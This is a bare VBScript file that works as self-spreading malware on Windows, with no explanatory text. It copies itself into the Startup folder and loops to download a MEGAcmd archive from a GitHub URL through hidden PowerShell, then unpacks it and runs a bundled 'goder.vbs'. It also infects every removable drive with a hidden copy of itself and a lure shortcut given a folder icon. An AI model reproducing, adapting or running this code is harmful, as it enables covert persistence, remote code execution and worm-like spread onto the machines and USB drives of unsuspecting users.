Dim objFSO, objShell, goderExecuted
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
goderExecuted = False
Dim startupFolderPath, selfScriptPath, selfScriptName
startupFolderPath = objShell.SpecialFolders("Startup")
selfScriptPath = WScript.ScriptFullName
selfScriptName = objFSO.GetFileName(selfScriptPath)
If Not objFSO.FileExists(startupFolderPath & "\" & selfScriptName) Then
    objFSO.CopyFile selfScriptPath, startupFolderPath & "\" & selfScriptName
End If
Do
    Dim megaFolderPath
    megaFolderPath = "C:\Mega"
    If Not objFSO.FolderExists(megaFolderPath) Then
        objFSO.CreateFolder(megaFolderPath)
    End If
    Dim zipFilePath, url, MegacmdPath
    MegacmdPath = megaFolderPath & "\MEGAcmd"
    zipFilePath = megaFolderPath & "\MEGAcmd.zip"
    url = "https://github.com/snxerame/Mega/raw/main/MEGAcmd.zip"
    If Not objFSO.FolderExists(MegacmdPath) Then
        objShell.Run "powershell -command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFilePath & "')""", 0, True
        Do While Not objFSO.FileExists(zipFilePath)
            WScript.Sleep 1000
        Loop
        objShell.Run "powershell -command ""Expand-Archive -Path """ & zipFilePath & """ -DestinationPath C:\Mega""", 0, False
        WScript.Sleep 1000
        Dim zipFileSize, extractedFolderSize
        zipFileSize = objFSO.GetFile(zipFilePath).Size
        Do
            extractedFolderSize = GetFolderSize(MegacmdPath)
            WScript.Sleep 1000
        Loop While extractedFolderSize < zipFileSize
    End If
   Dim objExec
    If Not goderExecuted Then
        objShell.Run "cmd /c C: && cd " & megaFolderPath & "\MEGAcmd && goder.vbs", 0, False
        goderExecuted = True
    End If
    Dim driveLetter, removableDrivePath, scriptOnDrivePath, shortcutPath
    For Each drive In objFSO.Drives
    If drive.DriveType = 1 Then
        driveLetter = drive.Path
        removableDrivePath = driveLetter & "\"
        scriptOnDrivePath = removableDrivePath & selfScriptName
        shortcutPath = removableDrivePath & objFSO.GetBaseName(selfScriptName) & ".lnk"
        If Not objFSO.FileExists(scriptOnDrivePath) Then
            Dim startupScriptPath
            startupScriptPath = startupFolderPath & "\" & selfScriptName
            objFSO.CopyFile startupScriptPath, scriptOnDrivePath
            Dim objLink
            Set objLink = objShell.CreateShortcut(shortcutPath)
            objLink.TargetPath = scriptOnDrivePath
            objLink.IconLocation = "%SystemRoot%\system32\SHELL32.dll, 3"
            objLink.Save
            objShell.Run "cmd /c attrib +h """ & scriptOnDrivePath & """", 0, True
        End If
    End If
Next
    WScript.Sleep 5000
Loop
Function GetFolderSize(folderPath)
    Dim objFolder, objFile, totalSize
    totalSize = 0
    Set objFolder = objFSO.GetFolder(folderPath)
    For Each objFile In objFolder.Files
        totalSize = totalSize + objFile.Size
    Next
    GetFolderSize = totalSize
End Function
